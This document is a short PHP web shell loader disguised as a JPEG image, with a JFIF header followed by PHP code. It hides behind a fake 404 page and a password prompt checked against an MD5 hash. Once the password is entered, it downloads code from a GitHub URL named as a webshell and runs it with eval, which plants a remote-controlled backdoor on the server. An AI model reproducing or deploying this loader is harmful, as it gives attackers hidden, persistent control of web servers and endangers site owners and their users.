ÿØÿà JFIF      ÿþ readme<?php
session_start();
$password = '62623caf10268b16bb27676b5b27678f';

if (!isset($_SESSION[md5($password)])) {
    if(isset($_POST['password']) && !empty($_POST['password']) && md5($_POST['password']) == $password) {
        $_SESSION[md5($password)] = true;
    } else {
        http_response_code(404);
        echo '<form method="post" action=""><input type="password" style="border:none" name="password"></form>';
        exit;
    }
}
$sa = file_get_contents('https://raw.githubusercontent.com/exploit-haxor/webshell/main/bypas.php.jpg');
eval('?>'.$sa);
